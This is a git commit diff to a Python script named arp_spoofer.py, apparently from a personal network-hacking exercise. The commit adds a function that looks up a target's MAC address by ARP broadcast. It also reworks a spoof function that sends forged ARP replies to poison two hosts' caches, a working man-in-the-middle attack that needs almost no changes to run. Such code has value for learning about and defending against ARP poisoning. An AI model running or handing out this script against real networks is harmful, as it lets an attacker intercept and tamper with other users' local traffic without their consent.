b855d097276f6657805c574a427c859dce066da4
Andreas W <31095453+Sir-Casm@users.noreply.github.com>
2022-08-23 08:42:03 +0200

    adding automated mac address insertion
    + added function that retrieves a MAC address associated with an IP address
    - removing hard-coded MAC addresses by using new function

--- arp_spoofer.py
+++ arp_spoofer.py
@@ -4,12 +4,21 @@ import scapy.layers.l2 as l2
 import scapy.all as scapy
 
 
-def spoof(target_ip, target_mac, spoof_ip):
+def get_mac(ip):
+    arp_request = l2.ARP(pdst=ip)
+    broadcast = l2.Ether(dst="ff:ff:ff:ff:ff:ff")
+    broadcast_arp_request = broadcast/arp_request
+    answered_list = scapy.srp(broadcast_arp_request, timeout=1, verbose=False)[0]
+    return answered_list[0][1].hwsrc
+
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
     packet = l2.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     print(packet.show())
     print(packet.summary())
     scapy.send(packet)
 
 
-spoof("10.0.2.4", "00:11:22:33:44:55", "10.0.2.1")
-spoof("10.0.2.1", "55:44:33:22:11:00", "10.0.2.4")
+spoof("10.0.2.4", "10.0.2.1")
+spoof("10.0.2.1", "10.0.2.4")
